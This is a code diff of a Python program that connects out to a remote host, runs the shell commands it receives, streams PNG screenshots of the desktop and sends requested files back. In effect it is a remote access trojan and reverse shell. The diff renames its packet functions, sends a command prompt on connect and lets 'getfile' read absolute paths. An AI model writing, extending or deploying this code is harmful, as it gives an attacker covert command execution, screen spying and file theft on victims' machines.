@@ -6,7 +6,6 @@ import pyautogui as py
 import socket 
 import io
 import re
-import pathlib
 
 PACKET_SIZE = 10000
 
@@ -27,7 +26,7 @@ def connectSocket(HOST, PORT, debug: bool = False) -> socket:
         return
 
 # Implementation of the send() function with the packet system
-def sendPackets(sckt: socket, dataToSend: bytearray, typeOfRequest: int,  debug: bool):
+def sendMsg(sckt: socket, dataToSend: bytearray, typeOfRequest: int,  debug: bool):
     try:
         nOfPacketsToSend = math.ceil(len(dataToSend) / PACKET_SIZE)
         bytesSent = 0
@@ -62,7 +61,7 @@ def recvAll(sckt: socket, n: int) -> bytearray:
 #                                                                                 ^       |             ^
 #                                                                                 |       |             |
 #                                                                           packet length | type of request (0x63 "c", 0x73 "v")
-def recvPackets(sckt: socket, debug: bool = False) -> tuple:
+def recvMsg(sckt: socket, debug: bool = False) -> tuple:
     try:
         receivedData = b""
         packetHeader = recvAll(sckt, 7)
@@ -99,15 +98,6 @@ def getCurrentDirectory() -> str:
     currentDir = (output.stdout[:len(output.stdout)-2]).decode()
     return currentDir
 
-def checkIfAvailableInDirectory(currentDir: str, cmd: str, offset: int) -> bool:
-    command = "dir" + " " + '"' + currentDir + '"'
-    output = subprocess.getoutput(command)
-    if output.find(cmd[offset:]) != -1:
-        return True
-    else:
-        return False 
-
-
 # Main server function
 def mainServer(HOST, PORT, debug: bool = False):
     # Create the server-client socket
@@ -117,8 +107,9 @@ def mainServer(HOST, PORT, debug: bool = False):
     startedVideoShare = False
     currentDirectory = getCurrentDirectory()
 
+    sendMsg(clientSocket, f"{currentDirectory}>".encode(), 0x63, debug)
     while True:
-        typeOfRequest, command = recvPackets(clientSocket, debug)
+        typeOfRequest, command = recvMsg(clientSocket, debug)
         try:
             command: str = command.decode()
         except:
@@ -132,18 +123,19 @@ def mainServer(HOST, PORT, debug: bool = False):
             sys.exit(0)
         if command == "EXIT0x02":
             startedVideoShare = False
-            clientSocket = connectSocket(HOST, PORT, debug)      
+            clientSocket = connectSocket(HOST, PORT, debug)
+            sendMsg(clientSocket, f"{currentDirectory}>".encode(), 0x63, debug)     
 
         # If the request is a string request (0x63 is "c" in ascii, it stands for char)
         if typeOfRequest == 0x63:
 
             # Getting current directory
             if command == "dir":
-                command = command + " " + '"' + currentDirectory + '\\"'
+                command = f'{command} "{currentDirectory}\\"'
             if command == "cd ..":
                 currentDirectory = currentDirectory[:currentDirectory.rfind('\\')]
-            if command.find("cd .") == -1 and command.find("cd") != -1 and not re.match("[A-Z]:", command[3:]) and checkIfAvailableInDirectory(currentDirectory, command, 3):
-                currentDirectory = currentDirectory + "\\" + command[3:]
+            if command.find("cd .") == -1 and command.find("cd ") != -1 and not re.match("[A-Z]:", command[3:]) and os.path.exists(f"{currentDirectory}\\{command[3:]}"):
+                currentDirectory = f"{currentDirectory}\\{command[3:]}"
             if re.match("[A-Z]:", command):
                 currentDirectory = command
 
@@ -151,15 +143,14 @@ def mainServer(HOST, PORT, debug: bool = False):
             
             # If the commmand has no output
             if output.stdout == b"":
-                sendPackets(clientSocket, currentDirectory.encode() + b">", 99, debug)
+                sendMsg(clientSocket, f"{currentDirectory}>".encode(), 99, debug)
             else:
-                print(command)
-                finalOutput = output.stdout + "\n".encode() + currentDirectory.encode() + b">"
-                sendPackets(clientSocket, finalOutput, 99, debug)
+                finalOutput = output.stdout + b"\n" + f"{currentDirectory}>".encode()
+                sendMsg(clientSocket, finalOutput, 99, debug)
 
             # DEBUG
             if debug and not output.stdout == "":
-                print("[DEBUG] String request output: ", output.stdout)
+                print("[DEBUG] Command output: ", output.stdout)
 
         # If the request is a video request (0x76 is "v" in ascii, it stands for video)
         if typeOfRequest == 0x76:
@@ -171,13 +162,12 @@ def mainServer(HOST, PORT, debug: bool = False):
                 frameBytes = io.BytesIO()
                 frame.save(frameBytes, format="PNG") # Convert it to a png file
                 screenBuffer = frameBytes.getvalue()
-                sendPackets(clientSocket, screenBuffer, 0x76, debug) # Send the data through the network
+                sendMsg(clientSocket, screenBuffer, 0x76, debug) # Send the data through the network
 
             # If the video request if a video stop request
             if "stop" in command:
                 startedVideoShare = False
-                sendPackets(clientSocket, b"Video stream stopped!", 0x63, debug)
-                continue
+                sendMsg(clientSocket, b"Video stream stopped!", 0x63, debug)
             
             # If the video request is a video continue command
             if "continue" in command:
@@ -185,23 +175,24 @@ def mainServer(HOST, PORT, debug: bool = False):
                 frameBytes = io.BytesIO()
                 frame.save(frameBytes, format="PNG")
                 screenBuffer = frameBytes.getvalue()
-                sendPackets(clientSocket, screenBuffer, 0x76, debug)
+                sendMsg(clientSocket, screenBuffer, 0x76, debug)
         
         # If the request if a file request
         if typeOfRequest == 0x66:
 
             # If the file request is a "getfile" request
             if "getfile" in command:
-                filePath = currentDirectory + "\\" + command[8:] # Construct the file path
-                if checkIfAvailableInDirectory(currentDirectory, command, 8): # Check if the file is available in the currentDirectory
-                    if os.path.getsize(filePath) < 2000000000: # Check if its bigger than 2GB
-                        # Read and send the file data
-                        with open(filePath, "rb") as reader:
-                            fileData = reader.read()
-                            sendPackets(clientSocket, fileData, 0x66, debug)
+                filePath = currentDirectory + "\\" + command[8:] if command.find(":") == -1 else command[8:] # Construct the file path
+                if os.path.getsize(filePath) < 2000000000 and os.path.exists(filePath): # Check if its bigger than 2GB and if the path exists
+                    # Read and send the file data
+                    with open(filePath, "rb") as reader:
+                        fileData = reader.read()
+                        sendMsg(clientSocket, fileData, 0x66, debug)
+                        sendMsg(clientSocket, f"{currentDirectory}>".encode(), 0x66, debug)
                 else:
-                    errorMessage = b"EE" + b"No file with name " + command[8:].encode() + b" in " + currentDirectory.encode() + b"\n" + currentDirectory.encode() + b">"
-                    sendPackets(clientSocket, errorMessage, 0x63, debug)
+                    errorMessage = b"EE" + b"No file with name " + command[8:].encode() + b" in " + currentDirectory.encode() + b"\n" + f"{currentDirectory}>".encode()
+                    sendMsg(clientSocket, errorMessage, 0x63, debug)
+                    print("ERROR")
                      
 
 
